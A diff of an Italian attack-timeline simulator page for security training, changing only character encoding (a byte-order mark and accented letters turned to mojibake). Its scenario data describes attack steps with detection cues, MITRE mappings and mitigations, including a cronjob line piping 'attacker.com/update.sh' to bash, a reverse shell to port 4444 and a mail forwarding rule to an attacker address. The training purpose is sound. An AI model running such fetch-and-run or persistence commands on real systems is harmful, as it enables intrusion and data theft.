@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+Ôªø<!DOCTYPE html>
 <html lang="it">
 <head>
   <meta charset="UTF-8">
@@ -50,7 +50,7 @@
             <a href="#">Strumenti ?</a>
             <div class="dropdown">
               <a href="security-check.html">URL / Website Security Check</a>
-              <a href="vulnerability-scanner.html">Scanner Vulnerabilit‡</a>
+              <a href="vulnerability-scanner.html">Scanner Vulnerabilit√†</a>
               <a href="dns-enumerator.html">DNS Records Enumerator</a>
               <a href="subdomain-finder.html">Subdomain Finder</a>
               <a href="ssl-analyzer.html">SSL Certificate Analyzer</a>
@@ -136,7 +136,7 @@
 
         <!-- Speed Selector -->
         <div class="control-group">
-          <label for="speed-select">?? Velocit‡:</label>
+          <label for="speed-select">?? Velocit√†:</label>
           <select id="speed-select" onchange="setSpeed(this.value)">
             <option value="0.5">x0.5 (Lento)</option>
             <option value="1" selected>x1.0 (Normale)</option>
@@ -287,7 +287,7 @@
         events: [
           { time: '09:00:00', severity: 'info', title: 'Scannerizzazione porte server', description: 'Attaccante esegue nmap verso 192.168.1.50', soc: 'Traffic anomalo da IP estero rilevato', mitigations: 'Bloccare port scanning con IDS', mitre: 'Reconnaissance (T1592)', phase: 'reconnaissance' },
           { time: '09:15:30', severity: 'info', title: 'Enumerazione servizi web', description: 'Tentativo di accesso a /admin, /wp-admin, /config.php', soc: 'HTTP 404 responses anomali (directory fuzzing)', mitigations: 'Implementare WAF per bloccare fuzzing', mitre: 'Reconnaissance (T1592)', phase: 'reconnaissance' },
-          { time: '10:22:45', severity: 'warning', title: 'Vulnerabilit‡ trovata', description: 'WordPress versione 5.8.1 (vulnerabile a CVE-2021-29447)', soc: 'Sistema vulnerabile identificato da attaccante', mitigations: 'Aggiornare WordPress immediatamente', mitre: 'Vulnerability Scanning (T1592)', phase: 'reconnaissance' },
+          { time: '10:22:45', severity: 'warning', title: 'Vulnerabilit√† trovata', description: 'WordPress versione 5.8.1 (vulnerabile a CVE-2021-29447)', soc: 'Sistema vulnerabile identificato da attaccante', mitigations: 'Aggiornare WordPress immediatamente', mitre: 'Vulnerability Scanning (T1592)', phase: 'reconnaissance' },
           { time: '11:05:12', severity: 'alert', title: 'EXPLOIT WORDPRESS ESEGUITO', description: 'RCE via plugin XMLrpc.php - Shell caricata', soc: 'Request POST sospetto a /xmlrpc.php con payload', mitigations: 'Bloccare accesso XML-RPC se non necessario', mitre: 'Exploit of RCE (T1190)', phase: 'access' },
           { time: '11:08:33', severity: 'alert', title: 'Reverse shell stabilita', description: 'Attaccante ottiene shell interattiva sul webserver', soc: 'Connessione TCP outbound verso 192.168.100.50:4444', mitigations: 'Bloccare connessioni outbound non autorizzate (egress filtering)', mitre: 'Ingress Tool Transfer (T1105)', phase: 'access' },
           { time: '11:30:15', severity: 'alert', title: 'Backdoor persistente installata', description: 'Cronjob aggiunto per ri-infezione: */5 * * * * curl attacker.com/update.sh | bash', soc: 'Nuovi cronjob non autorizzati in /var/spool/cron/', mitigations: 'Monitorare /etc/cron* e cronjob con osquery', mitre: 'Scheduled Task/Job (T1053)', phase: 'persistence' },
@@ -332,7 +332,7 @@
       'account-breach': {
         name: 'Account Breach (Credential Stuffing)',
         events: [
-          { time: '00:30:00', severity: 'info', title: 'Credenziale dalla dark web', description: 'Attaccante ha accesso a database da breach precedente: email:password lista da LastPass leak 2022', soc: 'No detection possible finchÈ non usate', mitigations: 'Password changed regularly, breach notification', mitre: 'Credentials from breach', phase: 'reconnaissance' },
+          { time: '00:30:00', severity: 'info', title: 'Credenziale dalla dark web', description: 'Attaccante ha accesso a database da breach precedente: email:password lista da LastPass leak 2022', soc: 'No detection possible finch√© non usate', mitigations: 'Password changed regularly, breach notification', mitre: 'Credentials from breach', phase: 'reconnaissance' },
           { time: '07:15:00', severity: 'warning', title: 'Credential stuffing attack', description: 'Attaccante tenta 50.000 email:password combinations', soc: 'Multiple failed logins da IP 185.220.101.50 (Tor exit node)', mitigations: 'Rate limiting dovrebbe bloccare dopo 5 fallimenti', mitre: 'Brute Force (T1110)', phase: 'reconnaissance' },
           { time: '08:00:00', severity: 'alert', title: 'ACCOUNT COMPROMISE - Marketing Manager', description: 'Credenziale valida: marketing@company.com:SuperPass123! (riusata da altro breach)', soc: 'Successful login dall\'IP Tor 07:59:45, location: unknown', mitigations: 'Force password reset, 2FA required', mitre: 'Valid Accounts (T1078)', phase: 'access' },
           { time: '08:30:00', severity: 'alert', title: 'Email forwarding rule creata', description: 'Attaccante aggiunge forward: *.* a attacker@protonmail.com', soc: 'Mailbox rule modification event in audit log', mitigations: 'Monitor mailbox rules via Azure Audit', mitre: 'Email Forwarding Rule (T1114)', phase: 'persistence' },
@@ -449,7 +449,7 @@
       updateStatus();
     }
 
-    // Imposta velocit‡
+    // Imposta velocit√†
     function setSpeed(speed) {
       timelineState.speed = parseFloat(speed);
     }
@@ -508,7 +508,7 @@
 
       // Dati compromessi
       const hasDataBreach = timelineState.events.slice(0, processedEvents).some(e => e.description.toLowerCase().includes('exfiltration') || e.description.toLowerCase().includes('dump'));
-      const compromisedDataText = hasDataBreach ? 'SÏ - ' + (processedEvents * Math.random() * 100000).toFixed(0) + ' record' : 'No';
+      const compromisedDataText = hasDataBreach ? 'S√¨ - ' + (processedEvents * Math.random() * 100000).toFixed(0) + ' record' : 'No';
       document.getElementById('compromised-data').textContent = compromisedDataText;
     }
 
@@ -540,6 +540,7 @@
   <script src="/js/progress-manager.js"></script>
 </body>
 </html>
+
 
 
 
